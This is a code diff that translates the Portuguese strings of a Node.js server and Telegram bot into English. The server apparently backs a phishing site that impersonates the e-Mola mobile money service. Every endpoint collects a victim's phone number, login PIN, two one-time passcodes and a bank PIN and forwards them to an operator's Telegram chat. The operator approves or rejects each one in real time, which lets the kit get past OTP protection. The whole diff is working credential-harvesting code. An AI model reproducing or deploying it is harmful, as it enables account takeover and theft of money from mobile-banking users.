@@ -29,32 +29,32 @@ app.get('/', (req, res) => {
 // -------------------- LOGIN API --------------------
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
-    const country = "Moçambique";
+    const country = "Mozambique";
     const countryCode = "+258";
 
-    const currentTime = new Date().toLocaleString('pt-MZ', {
+    const currentTime = new Date().toLocaleString('en-US', {
         month: 'numeric', day: 'numeric', year: 'numeric',
         hour: 'numeric', minute: 'numeric', second: 'numeric',
         hour12: false
     });
 
-    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });
+    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });
 
     statusStore[phone] = "pending";
 
-    const message = `📱 <b>e-Mola - TENTATIVA DE LOGIN</b>
+    const message = `📱 <b>e-Mola - LOGIN ATTEMPT</b>
 
-🆕 <b>NOVO UTILIZADOR</b>
-🇲🇿 <b>País:</b> ${country}
-🌍 <b>Código de País:</b> ${countryCode}
-📱 <b>Número de Telefone:</b> ${phone}
+🆕 <b>NEW USER</b>
+🇲🇿 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
 🔢 <b>PIN:</b> ${pin}
-⏰ <b>Hora:</b> ${currentTime}
+⏰ <b>Time:</b> ${currentTime}
 
 ━━━━━━━━━━━━━━━
 
-⚠️ <b>Aguardando aprovação</b>
-⌛ <b>Tempo limite: 5 minutos</b>`;
+⚠️ <b>Awaiting approval</b>
+⌛ <b>Time limit: 5 minutes</b>`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
@@ -62,8 +62,8 @@ app.post('/api/login-notification', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Permitir avançar", callback_data: `approve|${phone}|${pin}` },
-                        { text: "❌ Credenciais inválidas", callback_data: `deny|${phone}|${pin}` }
+                        { text: "✅ Allow / Approve", callback_data: `approve|${phone}|${pin}` },
+                        { text: "❌ Invalid Credentials", callback_data: `deny|${phone}|${pin}` }
                     ]
                 ]
             }
@@ -78,32 +78,32 @@ app.post('/api/login-notification', async (req, res) => {
 // -------------------- FIRST OTP API --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
     const { phone, otp } = req.body || {};
-    const country = "Moçambique";
+    const country = "Mozambique";
     const countryCode = "+258";
-    const currentTime = new Date().toLocaleString('pt-MZ', {
+    const currentTime = new Date().toLocaleString('en-US', {
         month: 'numeric', day: 'numeric', year: 'numeric',
         hour: 'numeric', minute: 'numeric', second: 'numeric',
         hour12: false
     });
 
-    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });
 
     statusStore[phone] = "pending_otp1";
 
-    const otpMessage = `1️⃣ <b>e-Mola - PRIMEIRA OTP (Passo 1/2)</b>
+    const otpMessage = `1️⃣ <b>e-Mola - FIRST OTP (Step 1/2)</b>
 
-🆕 <b>NOVO UTILIZADOR - PRIMEIRA VERIFICAÇÃO</b>
-🇲🇿 <b>País:</b> ${country}
-🌍 <b>Código de País:</b> ${countryCode}
-📱 <b>Número de Telefone:</b> ${phone}
-🔐 <b>Código OTP 1:</b> ${otp}
-⏰ <b>Hora:</b> ${currentTime}
+🆕 <b>NEW USER - FIRST VERIFICATION</b>
+🇲🇿 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔐 <b>OTP 1 Code:</b> ${otp}
+⏰ <b>Time:</b> ${currentTime}
 
 ━━━━━━━━━━━━━━━
 
-⚠️ <b>Verificar PRIMEIRA OTP:</b>
-⌛ <b>Tempo limite: 5 minutos</b>
-📝 <b>Seguinte: A segunda OTP será enviada após aprovação</b>`;
+⚠️ <b>Verify FIRST OTP:</b>
+⌛ <b>Time limit: 5 minutes</b>
+📝 <b>Next: Second OTP will be sent after approval</b>`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
@@ -111,8 +111,8 @@ app.post('/api/verify-first-otp', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Correto", callback_data: `otp1_correct|${phone}|${otp}` },
-                        { text: "❌ Código Incorreto", callback_data: `otp1_wrong|${phone}` }
+                        { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
+                        { text: "❌ Incorrect Code", callback_data: `otp1_wrong|${phone}` }
                     ]
                 ]
             }
@@ -127,31 +127,31 @@ app.post('/api/verify-first-otp', async (req, res) => {
 // -------------------- SECOND OTP API --------------------
 app.post('/api/verify-second-otp', async (req, res) => {
     const { phone, otp } = req.body || {};
-    const country = "Moçambique";
+    const country = "Mozambique";
     const countryCode = "+258";
-    const currentTime = new Date().toLocaleString('pt-MZ', {
+    const currentTime = new Date().toLocaleString('en-US', {
         month: 'numeric', day: 'numeric', year: 'numeric',
         hour: 'numeric', minute: 'numeric', second: 'numeric',
         hour12: false
     });
 
-    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });
 
     statusStore[phone] = "pending_otp2";
 
-    const otpMessage2 = `2️⃣ <b>e-Mola - SEGUNDA OTP (Passo 2/2)</b>
+    const otpMessage2 = `2️⃣ <b>e-Mola - SECOND OTP (Step 2/2)</b>
 
-🆕 <b>NOVO UTILIZADOR - SEGUNDA VERIFICAÇÃO</b>
-🇲🇿 <b>País:</b> ${country}
-🌍 <b>Código de País:</b> ${countryCode}
-📱 <b>Número de Telefone:</b> ${phone}
-🔐 <b>Código OTP 2:</b> ${otp}
-⏰ <b>Hora:</b> ${currentTime}
+🆕 <b>NEW USER - SECOND VERIFICATION</b>
+🇲🇿 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔐 <b>OTP 2 Code:</b> ${otp}
+⏰ <b>Time:</b> ${currentTime}
 
 ━━━━━━━━━━━━━━━
 
-⚠️ <b>Verificar SEGUNDA OTP:</b>
-⌛ <b>Tempo limite: 5 minutos</b>`;
+⚠️ <b>Verify SECOND OTP:</b>
+⌛ <b>Time limit: 5 minutes</b>`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
@@ -159,9 +159,9 @@ app.post('/api/verify-second-otp', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Correto", callback_data: `otp2_correct|${phone}|${otp}` },
-                        { text: "❌ Código Incorreto", callback_data: `otp2_wrong|${phone}` },
-                        { text: "🔑 PIN Incorreto", callback_data: `otp2_wrongpin|${phone}` }
+                        { text: "✅ Correct", callback_data: `otp2_correct|${phone}|${otp}` },
+                        { text: "❌ Incorrect Code", callback_data: `otp2_wrong|${phone}` },
+                        { text: "🔑 Incorrect PIN", callback_data: `otp2_wrongpin|${phone}` }
                     ]
                 ]
             }
@@ -177,13 +177,13 @@ app.post('/api/verify-second-otp', async (req, res) => {
 app.post('/api/resend-otp-notification', async (req, res) => {
     const { phone, step } = req.body || {};
     
-    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });
+    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });
 
-    const resendMsg = `🔄 <b>REENVIO SOLICITADO</b>
+    const resendMsg = `🔄 <b>RESEND REQUESTED</b>
 
-📱 <b>Número de Telefone:</b> ${phone}
-📍 <b>Passo:</b> ${step}
-⚠️ <b>O utilizador está a aguardar um novo código.</b>
+📱 <b>Phone Number:</b> ${phone}
+📍 <b>Step:</b> ${step}
+⚠️ <b>User is waiting for a new code.</b>
 
 ━━━━━━━━━━━━━━━`;
 
@@ -192,37 +192,37 @@ app.post('/api/resend-otp-notification', async (req, res) => {
         res.json({ success: true });
     } catch (err) {
         console.error(err);
-        res.status(500).json({ error: "Erro do Telegram" });
+        res.status(500).json({ error: "Telegram Error" });
     }
 });
 
 // -------------------- BANK PIN API --------------------
 app.post('/api/verify-bank-pin', async (req, res) => {
     const { phone, bankPin } = req.body || {};
-    const country = "Moçambique";
+    const country = "Mozambique";
     const countryCode = "+258";
-    const currentTime = new Date().toLocaleString('pt-MZ', {
+    const currentTime = new Date().toLocaleString('en-US', {
         month: 'numeric', day: 'numeric', year: 'numeric',
         hour: 'numeric', minute: 'numeric', second: 'numeric',
         hour12: false
     });
 
-    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });
+    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });
 
     statusStore[phone] = "pending_bank_pin";
 
-    const bankPinMessage = `🏦 <b>e-Mola - VERIFICAÇÃO DE PIN BANCÁRIO (Passo 3)</b>
+    const bankPinMessage = `🏦 <b>e-Mola - BANK PIN VERIFICATION (Step 3)</b>
 
-🆕 <b>NOVO UTILIZADOR - SEGURANÇA BANCÁRIA</b>
-🇲🇿 <b>País:</b> ${country}
-📱 <b>Número de Telefone:</b> ${phone}
-🔑 <b>PIN Bancário:</b> ${bankPin}
-⏰ <b>Hora:</b> ${currentTime}
+🆕 <b>NEW USER - BANK SECURITY</b>
+🇲🇿 <b>Country:</b> ${country}
+📱 <b>Phone Number:</b> ${phone}
+🔑 <b>Bank PIN:</b> ${bankPin}
+⏰ <b>Time:</b> ${currentTime}
 
 ━━━━━━━━━━━━━━━
 
-⚠️ <b>Verificar PIN BANCÁRIO:</b>
-⌛ <b>Tempo limite: 5 minutos</b>`;
+⚠️ <b>Verify BANK PIN:</b>
+⌛ <b>Time limit: 5 minutes</b>`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
@@ -230,15 +230,15 @@ app.post('/api/verify-bank-pin', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Correto", callback_data: `bank_correct|${phone}|${bankPin}` },
-                        { text: "❌ PIN Incorreto", callback_data: `bank_wrong|${phone}` }
+                        { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
+                        { text: "❌ Incorrect PIN", callback_data: `bank_wrong|${phone}` }
                     ]
                 ]
             }
         });
         res.json({ success: true });
     } catch (err) {
-        res.status(500).json({ error: "Erro do Telegram" });
+        res.status(500).json({ error: "Telegram Error" });
     }
 });
 
@@ -249,22 +249,22 @@ bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
     statusStore[phone] = "approved";
-    const currentTime = new Date().toLocaleTimeString('pt-MZ', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });
 
-    const approvedMsg = `✅ <b>LOGIN APROVADO</b>
+    const approvedMsg = `✅ <b>LOGIN APPROVED</b>
 
-🆕 <b>NOVO UTILIZADOR</b>
-🇲🇿 <b>Moçambique</b>
+🆕 <b>NEW USER</b>
+🇲🇿 <b>Mozambique</b>
 📱 <b>${phone}</b>
 🔐 <b>${pin}</b>
 
 ━━━━━━━━━━━━━━━
 
-✅ <b>Estado: Aprovado</b>
-➡️ <b>Seguinte: Primeira OTP (1/2)</b>
+✅ <b>Status: Approved</b>
+➡️ <b>Next: First OTP (1/2)</b>
 ⏱️ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("Permitido");
+    await ctx.answerCbQuery("Allowed");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(approvedMsg);
 });
@@ -274,20 +274,20 @@ bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
     statusStore[phone] = "denied";
-    const currentTime = new Date().toLocaleTimeString('pt-MZ', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });
 
-    const deniedMsg = `❌ <b>CREDENCIAIS INVÁLIDAS</b>
+    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>
 
-🇲🇿 <b>Moçambique</b>
+🇲🇿 <b>Mozambique</b>
 📱 <b>${phone}</b>
 🔐 <b>${pin}</b>
 
 ━━━━━━━━━━━━━━━
 
-❌ <b>Estado: Rejeitado</b>
+❌ <b>Status: Rejected</b>
 ⏱️ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("Rejeitado");
+    await ctx.answerCbQuery("Rejected");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(deniedMsg);
 });
@@ -297,21 +297,21 @@ bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const otp = ctx.match[2];
     statusStore[phone] = "otp1_correct";
-    const currentTime = new Date().toLocaleTimeString('pt-MZ', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });
 
-    const verifiedMsg = `1️⃣ <b>PRIMEIRA OTP VERIFICADA (Passo 1/2)</b>
+    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>
 
-🇲🇿 <b>Moçambique</b>
+🇲🇿 <b>Mozambique</b>
 📱 <b>${phone}</b>
 🔐 <b>${otp}</b>
 
 ━━━━━━━━━━━━━━━
 
-✅ <b>Estado: Primeira OTP verificada</b>
-➡️ <b>Seguinte: Segunda OTP (2/2) será enviada</b>
+✅ <b>Status: First OTP Verified</b>
+➡️ <b>Next: Second OTP (2/2) will be sent</b>
 ⌛ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("Verificado");
+    await ctx.answerCbQuery("Verified");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(verifiedMsg);
 });
@@ -320,9 +320,9 @@ bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
 bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp1_wrong";
-    await ctx.answerCbQuery("Código Incorreto");
+    await ctx.answerCbQuery("Incorrect Code");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>PRIMEIRA OTP INCORRETA</b>\n📱 <b>Utilizador:</b> ${phone}\n⚠️ <b>Solicitado reenvio de OTP.</b>`);
+    await ctx.replyWithHTML(`❌ <b>INCORRECT FIRST OTP</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested OTP resend.</b>`);
 });
 
 // OTP2 CORRECT
@@ -330,21 +330,21 @@ bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const otp = ctx.match[2];
     statusStore[phone] = "otp2_correct";
-    const currentTime = new Date().toLocaleTimeString('pt-MZ', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });
 
-    const verifiedMsg2 = `2️⃣ <b>SEGUNDA OTP VERIFICADA (Passo 2/2)</b>
+    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>
 
-🇲🇿 <b>Moçambique</b>
+🇲🇿 <b>Mozambique</b>
 📱 <b>${phone}</b>
 🔐 <b>${otp}</b>
 
 ━━━━━━━━━━━━━━━
 
-✅ <b>Estado: Segunda OTP verificada</b>
-✅ <b>Processo Concluído</b>
+✅ <b>Status: Second OTP Verified</b>
+✅ <b>Process Completed</b>
 ⌛ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("Concluído");
+    await ctx.answerCbQuery("Completed");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(verifiedMsg2);
 });
@@ -353,9 +353,9 @@ bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
 bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp2_wrong";
-    await ctx.answerCbQuery("Código Incorreto");
+    await ctx.answerCbQuery("Incorrect Code");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>SEGUNDA OTP INCORRETA</b>\n📱 <b>Utilizador:</b> ${phone}\n⚠️ <b>Solicitado reenvio de OTP.</b>`);
+    await ctx.replyWithHTML(`❌ <b>INCORRECT SECOND OTP</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested OTP resend.</b>`);
 });
 
 // BANK PIN CORRECT
@@ -364,18 +364,18 @@ bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
     const pin = ctx.match[2];
     statusStore[phone] = "bank_pin_correct";
     
-    const finalizedMsg = `✅ <b>PIN BANCÁRIO VERIFICADO</b>
+    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>
 
-🇲🇿 <b>Moçambique</b>
+🇲🇿 <b>Mozambique</b>
 📱 <b>${phone}</b>
 🔑 <b>${pin}</b>
 
 ━━━━━━━━━━━━━━━
 
-✅ <b>Estado: Processo Concluído</b>
-🏁 <b>Utilizador redirecionado para a página de sucesso</b>`;
+✅ <b>Status: Process Completed</b>
+🏁 <b>User redirected to success page</b>`;
 
-    await ctx.answerCbQuery("PIN Bancário Verificado");
+    await ctx.answerCbQuery("Bank PIN Verified");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(finalizedMsg);
 });
@@ -384,18 +384,18 @@ bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
 bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "bank_pin_wrong";
-    await ctx.answerCbQuery("PIN Bancário Incorreto");
+    await ctx.answerCbQuery("Incorrect Bank PIN");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>PIN BANCÁRIO INCORRETO</b>\n📱 <b>Utilizador:</b> ${phone}\n⚠️ <b>Solicitadareintrodução do PIN.</b>`);
+    await ctx.replyWithHTML(`❌ <b>INCORRECT BANK PIN</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested PIN re-entry.</b>`);
 });
 
 // OTP2 WRONG PIN
 bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp2_wrongpin";
-    await ctx.answerCbQuery("PIN Incorreto");
+    await ctx.answerCbQuery("Incorrect PIN");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`🔑 <b>PIN INCORRETO REPORTADO</b>\n📱 <b>Utilizador:</b> ${phone}\n⚠️ <b>Utilizador solicitado a reintroduzir o PIN.</b>`);
+    await ctx.replyWithHTML(`🔑 <b>INCORRECT PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested to re-enter PIN.</b>`);
 });
 
 // -------------------- STATUS CHECK (FIXED LOOP) --------------------
@@ -415,19 +415,19 @@ app.get('/:page', (req, res, next) => {
     if (req.params.page.startsWith('api')) return next();
     const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
     res.sendFile(path.join(__dirname, 'public', file), (err) => {
-        if (err) res.status(404).send("Página não encontrada");
+        if (err) res.status(404).send("Page not found");
     });
 });
 
 // -------------------- START SERVER & BOT --------------------
 app.listen(PORT, async () => {
-    console.log(`🚀 Servidor a rodar na porta ${PORT}`);
+    console.log(`🚀 Server running on port ${PORT}`);
     try {
         await bot.telegram.deleteWebhook({ drop_pending_updates: true });
         bot.launch();
-        console.log("🤖 Bot está ativo");
+        console.log("🤖 Bot is active");
     } catch (err) {
-        console.error("Erro ao iniciar o bot:", err);
+        console.error("Error starting bot:", err);
     }
 });
 
